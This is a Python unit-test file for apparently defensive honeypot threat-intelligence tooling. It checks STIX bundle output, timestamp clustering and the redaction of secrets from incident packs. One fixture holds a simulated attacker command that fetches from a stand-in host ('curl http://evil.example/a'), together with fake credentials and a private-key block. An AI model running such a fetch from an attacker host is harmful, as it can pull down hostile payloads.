import json
import datetime as dt
from pathlib import Path
import tempfile
import unittest
import sys

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / 'scripts'))
import intel_pack


class IntelPackTests(unittest.TestCase):
    def test_stix_references_emitted_address_objects_for_both_families(self):
        rows=intel_pack.cluster([
            {'source_ip':ip,'timestamp':'2026-11-01T00:00:00Z','bait_ids':['synthetic-bait']}
            for ip in ('192.0.2.10','2001:db8::10')])
        bundle=intel_pack.stix_bundle(rows)
        objects={row['id']:row for row in bundle['objects']}
        observed=[row for row in objects.values() if row['type']=='observed-data']
        self.assertEqual(len(observed),2)
        for row in observed:
            for reference in row['object_refs']:
                self.assertIn(reference,objects)
                address=objects[reference]
                self.assertIn(address['type'],('ipv4-addr','ipv6-addr'))
                pattern="["+address['type']+":value = '"+address['value']+"']"
                self.assertTrue(any(item.get('pattern')==pattern for item in objects.values()))
        self.assertEqual({row['type'] for row in objects.values() if row['type'].endswith('-addr')},
                         {'ipv4-addr','ipv6-addr'})
        self.assertFalse(any('anonymized' in row.get('labels',[]) for row in objects.values()))
        self.assertEqual(bundle,intel_pack.stix_bundle(rows))

    def test_cluster_time_bounds_compare_instants_instead_of_iso_text(self):
        rows=intel_pack.cluster([{'source_ip':'192.0.2.10','timestamp':stamp}
            for stamp in ('2026-11-01T00:00:00.100000Z','2026-11-01T01:00:00+01:00',
                          '2026-11-01T00:00:00.900000Z')])
        self.assertEqual(rows[0]['first_seen'],'2026-11-01T01:00:00+01:00')
        self.assertEqual(rows[0]['last_seen'],'2026-11-01T00:00:00.900000Z')
        observed=next(row for row in intel_pack.stix_bundle(rows)['objects'] if row['type']=='observed-data')
        self.assertEqual(observed['first_observed'],'2026-11-01T00:00:00.000000Z')
        self.assertEqual(observed['last_observed'],'2026-11-01T00:00:00.900000Z')

    def test_redaction_and_deterministic_stix(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            incident = root / 'incidents/2026-09-30/abc'
            incident.mkdir(parents=True)
            pem = '-----BEGIN ' + 'OPENSSH PRIVATE KEY-----\nPEMTOKEN99\n-----END ' + 'OPENSSH PRIVATE KEY-----'
            event = {
                'timestamp': '2026-09-30T12:00:00Z', 'source_ip': '203.0.113.10', 'username': 'root',
                'command': 'curl http://evil.example/a; echo s3cret HPAKIAabcdef12345678 ' + pem, 'url': 'http://evil.example/a',
                'domain': 'evil.example', 'sha256': 'ab' * 32, 'user_agent': 'scanner',
                'destination_port': 2222, 'password_present': True, 'bait_ids': ['bait-http'],
                'severity': 'HIGH',
                'tty': 'TTYDUMP raw session transcript',
                'private_key': pem,
            }
            (incident / 'events.jsonl').write_text(json.dumps({
                'event_id': '1', 'normalized': event, 'raw': {'password': 's3cret', 'input': event['command']},
            }) + '\n', encoding='utf-8')
            # Keep the fixed fixture within its intended window regardless of
            # the host date; exercise the existing injectable clock.
            now = dt.datetime(2026, 10, 1, tzinfo=dt.timezone.utc)
            out, combined = intel_pack.build_pack(root, '7d', now=now)
            self.assertNotIn('s3cret', combined)
            self.assertNotIn('HPAKIAabcdef12345678', combined)
            self.assertNotIn('TTYDUMP', combined)
            self.assertNotIn('PEMTOKEN99', combined)
            self.assertNotIn('PRIVATE KEY', combined)
            self.assertIn('password_present', combined)
            self.assertIn('bait-http', combined)
            self.assertIn('INFERRED', combined)
            pack = json.loads((out / 'pack.json').read_text(encoding='utf-8'))
            self.assertEqual(pack['clusters'][0]['source_ip'], '203.0.113.10')
            self.assertEqual(pack['clusters'][0]['asn'], 'UNKNOWN')
            stix = json.loads((out / 'pack.stix.json').read_text(encoding='utf-8'))
            self.assertEqual(stix['type'], 'bundle')
            self.assertTrue(all(obj.get('spec_version') == '2.1' for obj in stix['objects']))
            again, _combined = intel_pack.build_pack(root, '7d', now=now)
            self.assertEqual(json.loads((out / 'pack.json').read_text())['clusters'], json.loads((again / 'pack.json').read_text())['clusters'])
            manifest = (out / 'MANIFEST.sha256').read_text(encoding='utf-8')
            self.assertIn('pack.json', manifest)
            self.assertIn('brief.md', manifest)


if __name__ == '__main__':
    unittest.main()
